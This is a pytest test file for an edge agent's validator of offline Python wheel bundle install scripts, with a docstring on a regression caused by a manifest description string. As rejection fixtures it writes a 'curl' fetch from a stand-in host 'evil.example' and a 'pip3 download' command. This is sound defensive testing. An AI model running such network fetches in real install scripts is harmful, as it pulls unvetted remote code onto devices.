"""_validate_python_bundle_staged_scripts() — edge/agent.py's pre-install
check on a staged Python wheel bundle's scripts, and the exact regression
that failed real production update #271 (Edge 1, dependency_updates) on
2026-09-09.

This is the edge-side mirror of headend/main.py's
_validate_python_bundle_file_policy(). The edge copy scanned package-manifest.json
in addition to .sh/.bash/.conf/.txt, and manifest.json's "install_model" field
is a human-readable description string ("signed local wheel cache; pip install
--no-index --find-links exact-version install") that contains the substrings
"pip" and "install" without being a command line at all, and doesn't mention
the Edge venv path — so it always failed the "must target edge venv
explicitly" check before the real install-offline.sh was ever reached.
"""
import importlib.util
import sys
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
EDGE_VENV_PYTHON = "/opt/timelapse/venv/bin/python3"


def _load_agent_module():
    spec = importlib.util.spec_from_file_location("edge_agent_under_test_py_bundle", ROOT / "edge" / "agent.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


AGENT = _load_agent_module()


def test_accepts_real_install_offline_sh_alongside_the_manifest_that_broke_update_271(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        'cd "$(dirname "$0")"\n'
        f"{EDGE_VENV_PYTHON} -m pip install --no-index --find-links=packages 'Brotli==1.2.0' 'PyYAML==6.0.3'\n"
        "./verify-installed.sh\n"
    )
    (tmp_path / "package-manifest.json").write_text(
        '{\n'
        '  "architecture": "arm64",\n'
        '  "device_id": "TL-C87FF9587CA0",\n'
        '  "install_model": "signed local wheel cache; pip install --no-index --find-links exact-version install"\n'
        '}\n'
    )
    AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)  # must not raise


def test_rejects_pip_install_missing_no_index(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        f"#!/bin/bash\n{EDGE_VENV_PYTHON} -m pip install --find-links=packages 'Brotli==1.2.0'\n"
    )
    with pytest.raises(RuntimeError, match="without --no-index"):
        AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)


def test_rejects_pip_install_not_targeting_edge_venv(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\npip3 install --no-index --find-links=packages 'Brotli==1.2.0'\n"
    )
    with pytest.raises(RuntimeError, match="must target edge venv explicitly"):
        AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)


def test_rejects_real_curl_invocation(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\ncurl https://evil.example/x\n")
    with pytest.raises(RuntimeError, match="forbidden online command"):
        AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)


def test_rejects_pip_download(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\npip3 download requests\n")
    with pytest.raises(RuntimeError, match="forbidden online command"):
        AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)


def test_ignores_json_manifest_even_when_it_alone_is_present(tmp_path):
    (tmp_path / "package-manifest.json").write_text(
        '{"install_model": "signed local wheel cache; pip install --no-index --find-links exact-version install"}\n'
    )
    AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)  # must not raise


def test_ignores_non_script_files(tmp_path):
    (tmp_path / "packages").mkdir()
    (tmp_path / "packages" / "brotli-1.2.0.whl").write_bytes(b"fake wheel bytes mentioning pip install")
    AGENT._validate_python_bundle_staged_scripts(tmp_path, EDGE_VENV_PYTHON)  # must not raise
